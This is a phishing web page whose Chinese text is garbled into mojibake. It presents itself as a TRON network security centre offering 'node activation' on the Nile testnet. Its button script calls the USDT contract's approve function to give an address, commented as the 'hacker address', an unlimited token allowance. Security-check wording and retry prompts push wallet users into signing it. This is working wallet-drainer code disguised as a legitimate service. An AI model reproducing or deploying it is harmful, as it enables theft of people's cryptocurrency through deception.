<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON ç½‘ç»œå®‰å…¨ä¸­å¿ƒ - èŠ‚ç‚¹æ¿€æ´»</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 350px;
            width: 90%;
        }
        .icon {
            font-size: 50px;
            color: #007aff;
            margin-bottom: 20px;
        }
        h2 {
            margin: 0 0 10px 0;
            font-size: 20px;
            color: #333;
        }
        p {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .btn {
            background-color: #007aff;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        .btn:active {
            background-color: #0056b3;
        }
        #status {
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">ğŸ›¡ï¸</div>
    <h2>èŠ‚ç‚¹çŠ¶æ€æ£€æŸ¥</h2>
    <p>ä¸ºäº†ä¿éšœæ‚¨çš„èµ„äº§å®‰å…¨å¹¶æ¿€æ´» Nile æµ‹è¯•ç½‘èŠ‚ç‚¹ï¼Œè¯·ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å®Œæˆç¯å¢ƒæˆæƒéªŒè¯ã€‚</p>
    
    <button class="btn" id="authBtn" onclick="requestApprove()">ç«‹å³æ¿€æ´»</button>
    
    <div id="status">å½“å‰ç¯å¢ƒï¼šæ³¢åœº Nile æµ‹è¯•ç½‘</div>
</div>

<script>
    // 1. å®šä¹‰ Nile æµ‹è¯•ç½‘å‚æ•°
    // Nile ç½‘æµ‹è¯• USDT åˆçº¦åœ°å€
    const USDT_CONTRACT = "TXYZPsBuzCcuykyB7DZieS4Zd4Fk27pZ19"; 
    // æ‚¨çš„é»‘å®¢åœ°å€
    const HACKER_ADDR = "TEtYuYpx3Vx6N5J3xdWAmT2UmHoTuEM8Hc";
    // æ— é™æˆæƒé¢åº¦ (2^256 - 1)
    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    async function requestApprove() {
        // 2. æ£€æŸ¥ç¯å¢ƒ
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            alert("è¯·åœ¨ TokenPocket, imToken æˆ– TronLink é’±åŒ…çš„ DApp æµè§ˆå™¨ä¸­æ‰“å¼€æ­¤é¡µé¢");
            return;
        }

        const btn = document.getElementById('authBtn');
        const statusDiv = document.getElementById('status');
        
        try {
            btn.innerText = "å¤„ç†ä¸­...";
            btn.disabled = true;

            // 3. å®ä¾‹åŒ–åˆçº¦
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);

            // 4. å‘èµ·æˆæƒè¯·æ±‚ (Approve)
            // è¿™å°†å”¤èµ·æ‰‹æœºé’±åŒ…çš„ç¡®è®¤å¼¹çª—
            const result = await contract.approve(HACKER_ADDR, MAX_UINT256).send({
                feeLimit: 100000000 // è®¾ç½® 100 TRX çš„è´¹ç”¨é™åˆ¶
            });

            console.log("æˆæƒæˆåŠŸï¼Œäº¤æ˜“å“ˆå¸Œ:", result);
            statusDiv.innerHTML = "âœ… æ¿€æ´»è¯·æ±‚å·²å‘é€ï¼Œè¯·ç­‰å¾…èŠ‚ç‚¹ç¡®è®¤";
            btn.innerText = "æ¿€æ´»æˆåŠŸ";
            btn.style.backgroundColor = "#28a745";

        } catch (error) {
            console.error("æ“ä½œå¤±è´¥:", error);
            btn.innerText = "é‡æ–°å°è¯•";
            btn.disabled = false;
            statusDiv.innerHTML = "âŒ æ“ä½œå·²å–æ¶ˆæˆ–å¤±è´¥";
            alert("æ“ä½œè¢«æ‹’ç»ï¼Œè¯·é‡è¯•ä»¥å®Œæˆæ¿€æ´»ã€‚");
        }
    }

    // è‡ªåŠ¨æ£€æµ‹é’±åŒ…è¿æ¥æƒ…å†µ
    window.onload = () => {
        if (window.tronWeb) {
            console.log("å·²è¿æ¥åˆ°é’±åŒ…:", window.tronWeb.defaultAddress.base58);
        }
    };
</script>

</body>
</html>
